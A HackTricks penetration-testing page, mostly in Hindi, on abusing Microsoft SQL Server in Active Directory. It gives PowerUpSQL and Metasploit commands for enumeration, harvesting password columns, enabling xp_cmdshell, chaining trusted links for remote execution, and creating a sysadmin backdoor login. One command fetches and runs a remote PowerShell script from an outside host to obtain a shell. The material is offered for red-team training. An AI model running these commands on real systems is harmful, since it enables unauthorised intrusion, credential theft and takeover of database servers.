# MSSQL AD Abuse

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## **MSSQL Enumeration / Discovery**

पॉवरशेल मॉड्यूल [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) इस मामले में बहुत उपयोगी है।
```powershell
Import-Module .\PowerupSQL.psd1
```
### नेटवर्क से डोमेन सत्र के बिना एन्यूमरेटिंग
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#If you don't have a AD account, you can try to find MSSQL scanning via UDP
#First, you will need a list of hosts to scan
Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads 10

#If you have some valid credentials and you have discovered valid MSSQL hosts you can try to login into them
#The discovered MSSQL servers must be on the file: C:\temp\instances.txt
Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
```
### डोमेन के अंदर से एन्यूमरेट करना
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#Get info about valid MSQL instances running in domain
#This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose

#Test connections with each one
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose

#Try to connect and obtain info from each MSSQL server (also useful to check conectivity)
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

# Get DBs, test connections and get info in oneliner
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
```
## MSSQL बुनियादी दुरुपयोग

### एक्सेस DB
```powershell
#Perform a SQL query
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"

#Dump an instance (a lotof CVSs generated in current dir)
Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"

# Search keywords in columns trying to access the MSSQL DBs
## This won't use trusted SQL links
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "password" -SampleSize 5 | select instance, database, column, sample | ft -autosize
```
### MSSQL RCE

यह MSSQL होस्ट के अंदर **कमांड्स** को निष्पादित करना भी संभव हो सकता है।
```powershell
Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
# Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
```
Check in the page mentioned in the **following section how to do this manually.**

### MSSQL Basic Hacking Tricks

{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
[pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
{% endcontent-ref %}

## MSSQL Trusted Links

यदि एक MSSQL उदाहरण को एक अलग MSSQL उदाहरण द्वारा विश्वसनीय (डेटाबेस लिंक) माना जाता है। यदि उपयोगकर्ता के पास विश्वसनीय डेटाबेस पर विशेषाधिकार हैं, तो वह **अन्य उदाहरण में क्वेरी निष्पादित करने के लिए विश्वास संबंध का उपयोग कर सकेगा**। ये विश्वास श्रृंखलाबद्ध किए जा सकते हैं और किसी बिंदु पर उपयोगकर्ता कुछ गलत कॉन्फ़िगर किए गए डेटाबेस को खोजने में सक्षम हो सकता है जहाँ वह कमांड निष्पादित कर सकता है।

**डेटाबेस के बीच के लिंक यहां तक कि वन ट्रस्ट के पार भी काम करते हैं।**

### Powershell Abuse
```powershell
#Look for MSSQL links of an accessible instance
Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0

#Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose

#If you are sysadmin in some trusted link you can enable xp_cmdshell with:
Get-SQLServerLinkCrawl -instance "<INSTANCE1>" -verbose -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "<INSTANCE2>"'

#Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query "exec master..xp_cmdshell 'whoami'"

#Obtain a shell
Get-SQLServerLinkCrawl -Instance dcorp-mssql  -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')"'

#Check for possible vulnerabilities on an instance where you have access
Invoke-SQLAudit -Verbose -Instance "dcorp-mssql.dollarcorp.moneycorp.local"

#Try to escalate privileges on an instance
Invoke-SQLEscalatePriv –Verbose –Instance "SQLServer1\Instance1"

#Manual trusted link queery
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select * from openquery(""sql2.domain.io"", 'select * from information_schema.tables')"
## Enable xp_cmdshell and check it
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'SELECT * FROM OPENQUERY("sql2.domain.io", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT [sql.rto.external]'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT [sql.rto.external]'
## If you see the results of @@selectname, it worked
Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
```
### Metasploit

आप आसानी से metasploit का उपयोग करके विश्वसनीय लिंक की जांच कर सकते हैं।
```bash
#Set username, password, windows auth (if using AD), IP...
msf> use exploit/windows/mssql/mssql_linkcrawler
[msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
```
ध्यान दें कि metasploit केवल `openquery()` फ़ंक्शन का दुरुपयोग करने की कोशिश करेगा MSSQL में (तो, यदि आप `openquery()` के साथ कमांड निष्पादित नहीं कर सकते हैं, तो आपको कमांड निष्पादित करने के लिए `EXECUTE` विधि **हाथ से** आज़मानी होगी, नीचे और अधिक देखें।)

### मैनुअल - Openquery()

**Linux** से आप **sqsh** और **mssqlclient.py** के साथ एक MSSQL कंसोल शेल प्राप्त कर सकते हैं।

**Windows** से आप लिंक भी ढूंढ सकते हैं और **MSSQL क्लाइंट जैसे** [**HeidiSQL**](https://www.heidisql.com) का उपयोग करके कमांड को मैन्युअल रूप से निष्पादित कर सकते हैं।

_Windows प्रमाणीकरण का उपयोग करके लॉगिन करें:_

![](<../../.gitbook/assets/image (808).png>)

#### विश्वसनीय लिंक खोजें
```sql
select * from master..sysservers;
EXEC sp_linkedservers;
```
![](<../../.gitbook/assets/image (716).png>)

#### भरोसेमंद लिंक में क्वेरी निष्पादित करें

लिंक के माध्यम से क्वेरी निष्पादित करें (उदाहरण: नए सुलभ उदाहरण में अधिक लिंक खोजें):
```sql
select * from openquery("dcorp-sql1", 'select * from master..sysservers')
```
{% hint style="warning" %}
जांचें कि डबल और सिंगल कोट्स कहाँ उपयोग किए गए हैं, उन्हें इस तरह से उपयोग करना महत्वपूर्ण है।
{% endhint %}

![](<../../.gitbook/assets/image (643).png>)

आप इन विश्वसनीय लिंक श्रृंखलाओं को मैन्युअल रूप से हमेशा जारी रख सकते हैं।
```sql
# First level RCE
SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')

# Second level RCE
SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
```
यदि आप `openquery()` से `exec xp_cmdshell` जैसी क्रियाएँ नहीं कर सकते हैं, तो `EXECUTE` विधि का प्रयास करें।

### मैनुअल - EXECUTE

आप `EXECUTE` का उपयोग करके विश्वसनीय लिंक का भी दुरुपयोग कर सकते हैं:
```bash
#Create user and give admin privileges
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
```
## स्थानीय विशेषाधिकार वृद्धि

**MSSQL स्थानीय उपयोगकर्ता** के पास आमतौर पर एक विशेष प्रकार का विशेषाधिकार होता है जिसे **`SeImpersonatePrivilege`** कहा जाता है। यह खाते को "प्रमाणीकरण के बाद एक ग्राहक का अनुकरण करने" की अनुमति देता है।

एक रणनीति जो कई लेखकों ने विकसित की है, वह है एक SYSTEM सेवा को एक धोखाधड़ी या मैन-इन-द-मिडल सेवा के लिए प्रमाणीकरण करने के लिए मजबूर करना जिसे हमलावर बनाता है। यह धोखाधड़ी सेवा तब SYSTEM सेवा का अनुकरण करने में सक्षम होती है जबकि यह प्रमाणीकरण करने की कोशिश कर रही होती है।

[SweetPotato](https://github.com/CCob/SweetPotato) के पास इन विभिन्न तकनीकों का एक संग्रह है जिसे Beacon के `execute-assembly` कमांड के माध्यम से निष्पादित किया जा सकता है।

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
AWS हैकिंग सीखें और अभ्यास करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks का समर्थन करें</summary>

* [**सदस्यता योजनाएँ**](https://github.com/sponsors/carlospolop) देखें!
* **हमारे** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में शामिल हों या **Twitter** 🐦 पर हमें **फॉलो** करें [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **हैकिंग ट्रिक्स साझा करें और** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) गिटहब रिपोजिटरी में PR सबमिट करें।

</details>
{% endhint %}
